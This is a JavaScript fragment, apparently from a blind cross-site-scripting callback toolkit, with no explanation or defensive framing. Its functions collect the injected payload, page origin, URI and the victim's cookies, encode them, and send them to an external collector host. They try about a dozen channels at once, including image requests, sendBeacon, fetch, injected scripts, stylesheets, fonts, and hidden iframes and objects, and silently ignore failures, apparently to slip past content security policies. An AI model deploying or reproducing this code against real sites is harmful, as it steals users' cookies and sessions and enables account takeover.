function ez_bu(type, data) {
    var u = ez_bb + "/beacon/" + type + "/" + ez_bid;
    if (data) {
        u += "?d=" + data;
    }
    return u;
}

function ez_bk(e) {
    try {
        var o = {
            payload: ez_n(e && e.payload),
            origin: ez_n(e && e.origin),
            uri: ez_n(e && e.uri),
            cookies: ("" + ez_n(e && e.cookies)).slice(0, 1024)
        };
        var j = ez_se(o);
        var b = window.btoa ? btoa(j) : "";
        if (!b) {
            return "";
        }
        b = b.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
        return b.length > 2000 ? "" : b;
    } catch (t) {
        return "";
    }
}

function ez_bf(u) {
    try {
        if (window.fetch) {
            fetch(u, { mode: "no-cors", credentials: "omit" }).then(void 0, function () { });
        } else if (window.XMLHttpRequest) {
            var x = new XMLHttpRequest();
            x.open("GET", u, !0);
            x.send(null);
        }
    } catch (t) { }
}

function ez_bc(e) {
    try {
        var d = ez_bk(e);

        try { new Image().src = ez_bu("img", d); } catch (t) { }

        try {
            var cu = ez_bu("connect", d);
            if (navigator.sendBeacon) {
                navigator.sendBeacon(cu, "");
            } else {
                ez_bf(cu);
            }
        } catch (t) { }

        try {
            var l = document.createElement("link");
            l.rel = "stylesheet";
            l.href = ez_bu("css", "");
            (document.head || document.documentElement).appendChild(l);
        } catch (t) { }

        try {
            var st = document.createElement("style");
            st.appendChild(document.createTextNode('@font-face{font-family:ezb;src:url("' + ez_bu("font", "") + '")}'));
            (document.head || document.documentElement).appendChild(st);
        } catch (t) { }

        try {
            var sc = document.createElement("script");
            sc.src = ez_bu("script", "");
            (document.head || document.documentElement).appendChild(sc);
        } catch (t) { }

        try {
            var au = document.createElement("audio");
            au.src = ez_bu("media", "");
        } catch (t) { }

        try {
            var hide = function (n) {
                n.setAttribute("width", "0");
                n.setAttribute("height", "0");
                n.style.cssText = "position:absolute;width:0;height:0;border:0;visibility:hidden";
                (document.body || document.documentElement).appendChild(n);
                setTimeout(function () { try { n.parentNode.removeChild(n); } catch (t) { } }, 5e3);
            };
            var fr = document.createElement("iframe");
            fr.src = ez_bu("frame", "");
            hide(fr);
            var ob = document.createElement("object");
            ob.data = ez_bu("object", "");
            hide(ob);
        } catch (t) { }

        try {
            var pf = document.createElement("link");
            pf.rel = "prefetch";
            pf.href = ez_bu("prefetch", "");
            (document.head || document.documentElement).appendChild(pf);
        } catch (t) { }

        ez_bf(ez_bu("manifest", ""));
        ez_bf(ez_bu("report", ""));
    } catch (t) { }
}
